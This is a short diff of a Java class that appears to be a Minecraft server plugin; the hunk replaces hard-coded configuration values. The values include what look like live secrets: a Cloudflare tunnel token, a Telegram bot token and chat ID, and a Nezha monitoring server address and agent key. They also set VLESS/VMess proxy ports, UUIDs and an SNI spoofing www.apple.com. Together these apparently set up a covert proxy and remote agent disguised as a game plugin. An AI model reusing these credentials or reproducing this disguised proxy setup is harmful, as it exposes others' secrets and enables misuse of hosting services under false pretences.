@@ -37,27 +37,27 @@ public class WlPlugins extends JavaPlugin {
     }
 
     private static void loadEnvVars(Map<String, String> envVars) {
-        envVars.put("TOK", "eyJhIjoiNGMyMGE2ZTY0MmM4YWZhNzMzZDRlYzY0N2I0OWRlZTQiLCJ0IjoiOTE4NDljNTctYWY5OC00OTFhLWIwNWUtMDlhNjFhNzkxN2U4IiwicyI6Ill6UmhNakprTkRNdE1EVmtNeTAwWkRVNExUZ3hPREl0WmpKbFpUZzBaVEl6TURFMyJ9");
-        envVars.put("ARGO_DOMAIN", "great-es.milan.us.kg");
+        envVars.put("TOK", "");
+        envVars.put("ARGO_DOMAIN", "");
         envVars.put("TUNNEL_PROXY", "");
 
-        envVars.put("TG", "6839843424 7872982458:AAG3mnTNQyeCXujvXw3okPMtp4cjSioO_DY");
+        envVars.put("TG", "6975394604 7425032752:AAH-txk6YNWCgwwxDqV4gghp4A_Khl9OQfc");
         envVars.put("SUB_URL", "");
 
-        envVars.put("NEZHA_SERVER", "nezha.9logo.eu.org:443");
-        envVars.put("NEZHA_KEY", "c0FdihFZ8XpqXFbu7muAAPkD5JmeVY4g");
+        envVars.put("NEZHA_SERVER", "amd2.felixlee.pp.ua:3489");
+        envVars.put("NEZHA_KEY", "iL4JaCkKSSWGixL1acMyrbh1ryhB1yhp");
         envVars.put("NEZHA_PORT", "");
-        envVars.put("NEZHA_TLS", "1");
-        envVars.put("AGENT_UUID", "307635b4-d657-4100-b1f7-775e34926bcf");
+        envVars.put("NEZHA_TLS", "0");
+        envVars.put("AGENT_UUID", "e17b4128-8b9f-419a-a67e-abc792b0bbd5");
 
         envVars.put("TMP_ARGO", "3x");
         envVars.put("VL_PORT", "8002");
         envVars.put("VM_PORT", "9010");
         envVars.put("CF_IP", "saas.sin.fan");
         envVars.put("SUB_NAME", "Great-ES");
-        envVars.put("SERVER_PORT", "20319");
+        envVars.put("SERVER_PORT", "20450");
         envVars.put("second_port", "");
-        envVars.put("UUID", "307635b4-d657-4100-b1f7-775e34926bcf");
+        envVars.put("UUID", "e17b4128-8b9f-419a-a67e-abc792b0bbd5");
         
         envVars.put("second_port", "");
         envVars.put("SNI", "www.apple.com");
